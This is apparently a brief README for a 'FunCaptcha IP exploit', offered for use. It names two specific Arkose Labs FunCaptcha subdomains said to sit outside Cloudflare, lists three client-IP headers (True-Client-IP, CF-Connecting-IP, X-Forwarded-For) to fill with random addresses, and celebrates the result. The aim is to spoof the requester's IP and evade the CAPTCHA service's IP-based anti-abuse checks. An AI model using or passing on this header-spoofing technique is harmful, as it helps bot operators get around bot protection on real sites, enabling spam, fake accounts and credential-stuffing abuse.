# FunCaptcha IP exploit

# How to use

To use this exploit you just have to use a funcaptcha subdomain that does not have Cloudflare in order to spoof the IP.

For example, you can use funcaptcha-eb-prod2.arkoselabs.com or funcaptcha-eb-prod.arkoselabs.com

And then, include this in your headers:

'True-Client-IP': random_ip_address,
'CF-Connecting-IP': random_ip_address,
'X-Forwarded-For': random_ip_address,

And boom, you just spoofed your IP, gg :D.
